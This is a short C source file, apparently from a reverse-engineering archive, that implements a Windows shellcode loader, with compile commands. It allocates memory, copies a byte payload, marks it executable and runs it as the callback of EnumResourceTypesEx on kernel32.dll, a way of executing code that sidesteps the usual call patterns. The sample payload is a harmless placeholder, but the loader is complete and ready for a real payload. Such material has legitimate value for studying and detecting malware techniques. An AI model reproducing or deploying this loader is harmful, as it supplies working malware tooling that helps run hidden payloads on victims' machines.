/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

Compile:
    $ rc resources.rc
    $ cvtres /MACHINE:x64 resources.res
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /MACHINE:x64 /Tccode.cpp resources.obj

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  EnumResourceTypesEx

Note:
    For executing EnumResourceTypes, the binary should have at least one resource.
    Our approach is to enumerate from other module which has resource, 
    such as kernel32.dll 
*/

#include <windows.h>
#include <stdint.h>

int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        // enumerate the current module
        EnumResourceTypesEx (GetModuleHandle("kernel32.dll"), (ENUMRESTYPEPROCA)runtime, NULL, RESOURCE_ENUM_VALIDATE, NULL);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}